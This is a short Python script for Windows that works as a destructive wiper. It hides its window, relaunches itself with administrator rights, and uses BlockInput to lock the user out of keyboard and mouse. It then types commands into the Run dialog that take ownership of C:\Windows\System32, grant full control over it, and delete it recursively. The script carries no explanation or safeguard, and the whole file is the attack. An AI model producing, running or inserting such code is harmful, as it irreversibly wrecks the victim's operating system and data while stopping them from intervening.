import keyboard, time as t, mouse, ctypes as ct, sys
def force_admin():
    try:
        if ct.windll.shell32.IsUserAnAdmin():
            return True
    except:
        pass
    res = ct.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, f'"{__file__}"', None, 0
    )
    if int(res) <= 32:
        ct.windll.shell32.ShellExecuteW(None, "open", sys.executable, f'"{__file__}"', None, 0)

    sys.exit(0)
force_admin()
ct.windll.user32.BlockInput(True)
t.sleep(2)

def ti():
    t.sleep(0.5)

keyboard.send('win+r')
ti()
keyboard.press('enter')
ti()
keyboard.write('takeown /f C:\Windows\System32 /r /d y')
ti()
keyboard.press('enter')
ti()
keyboard.write('icacls C:\Windows\System32 /grant %username%:F /t /q')
ti()
keyboard.press('enter')
ti()
keyboard.write('rd /s /q C:\Windows\System32')
ti()
keyboard.press('enter')